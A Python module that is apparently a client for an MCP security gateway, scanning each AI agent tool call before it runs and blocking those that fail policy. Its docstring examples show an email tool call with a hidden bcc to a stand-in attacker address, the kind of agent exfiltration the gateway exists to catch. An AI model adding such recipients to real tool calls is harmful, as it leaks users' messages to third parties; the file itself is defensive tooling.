"""Client middleware for routing real MCP tool calls through the security gateway.

This is how a live product feed is produced: wrap your agent's tool-execution
function with ``guard()``. Every tool call is scanned by the running gateway
(POST /api/scan), which streams the verdict to the live dashboard and blocks
calls that fail policy.

Example
-------
    from mcp_monitor.client import GatewayClient

    gw = GatewayClient("http://localhost:8000")

    @gw.guard
    def send_email(**kwargs):
        # your real tool implementation
        return smtp_send(**kwargs)

    # Blocked calls raise ToolBlocked before the real tool runs:
    send_email(server_id="postmark", to="u@x.com", bcc="attacker@evil.com")

Or scan explicitly:

    verdict = gw.scan({"name": "email.send", "server_id": "postmark",
                       "arguments": {"to": "u@x.com", "bcc": "evil@x.com"}})
    if not verdict["allowed"]:
        raise RuntimeError("blocked")
"""

from __future__ import annotations

import functools
import json
import urllib.error
import urllib.request
from collections.abc import Callable
from typing import Any
from urllib.parse import urlparse


class ToolBlocked(Exception):
    """Raised when the gateway blocks a tool call before execution."""

    def __init__(self, verdict: dict[str, Any]) -> None:
        self.verdict = verdict
        layer = verdict.get("blocked_by_layer")
        risk = verdict.get("risk_score")
        super().__init__(f"Tool call blocked by layer {layer} (risk={risk})")


class GatewayClient:
    """Thin HTTP client for the MCP security gateway's /api/scan endpoint.

    Availability policy
    -------------------
    ``fail_closed`` selects what happens when the gateway is unreachable (network
    error, timeout, non-2xx). The default is **fail-open** so that a monitoring
    deployment never takes the agent down when the gateway blips. Security-
    critical deployments should pass ``fail_closed=True`` so an unreachable
    gateway causes tool calls to be *blocked* rather than silently allowed.
    """

    def __init__(
        self,
        base_url: str = "http://localhost:8000",
        timeout: float = 5.0,
        *,
        fail_closed: bool = False,
    ) -> None:
        normalized_url = base_url.rstrip("/")
        parsed = urlparse(normalized_url)
        if parsed.scheme not in {"http", "https"} or not parsed.netloc:
            raise ValueError("GatewayClient base_url must be an absolute HTTP or HTTPS endpoint")
        self.base_url = normalized_url
        self.timeout = timeout
        self.fail_closed = fail_closed

    def scan(self, tool_call: dict[str, Any]) -> dict[str, Any]:
        """POST a tool call to the gateway and return the verdict dict.

        The gateway records the event and streams it to the live dashboard.

        Availability behaviour on transport error is governed by ``fail_closed``
        (set at construction):

        - ``fail_closed=False`` (default): return an allowing verdict so the
          gateway being down never breaks the agent (fail-open).
        - ``fail_closed=True``: return a blocking verdict so an unreachable
          gateway causes the call to be blocked (fail-closed).
        """
        data = json.dumps(tool_call).encode("utf-8")
        req = urllib.request.Request(
            f"{self.base_url}/api/scan",
            data=data,
            headers={"Content-Type": "application/json"},
            method="POST",
        )
        try:
            # base_url is validated in __init__ to be an absolute HTTP(S) URL.
            with urllib.request.urlopen(req, timeout=self.timeout) as resp:  # nosec B310
                return json.loads(resp.read().decode("utf-8"))
        except (urllib.error.URLError, TimeoutError, OSError, ValueError) as exc:
            # Transport-level failure: apply the configured availability policy.
            return {
                "call_id": None,
                "allowed": not self.fail_closed,
                "blocked_by_layer": None if not self.fail_closed else 0,
                "risk_score": 0,
                "enforcement_action": "allow" if not self.fail_closed else "block",
                "layer_results": [],
                "transport_error": str(exc),
                "fail_closed": self.fail_closed,
            }

    def guard(self, fn: Callable[..., Any]) -> Callable[..., Any]:
        """Decorator: scan the tool call before running ``fn``.

        The wrapped function must accept ``server_id`` and its tool arguments as
        keyword arguments. The tool name is taken from ``fn.__name__`` unless a
        ``tool_name`` kwarg is supplied.
        """

        @functools.wraps(fn)
        def wrapper(*args: Any, **kwargs: Any) -> Any:
            tool_name = kwargs.pop("tool_name", fn.__name__)
            server_id = kwargs.get("server_id", "unknown")
            tool_call = {
                "name": tool_name,
                "server_id": server_id,
                "arguments": {k: v for k, v in kwargs.items() if k != "server_id"},
            }
            verdict = self.scan(tool_call)
            if not verdict.get("allowed", True):
                raise ToolBlocked(verdict)
            return fn(*args, **kwargs)

        return wrapper
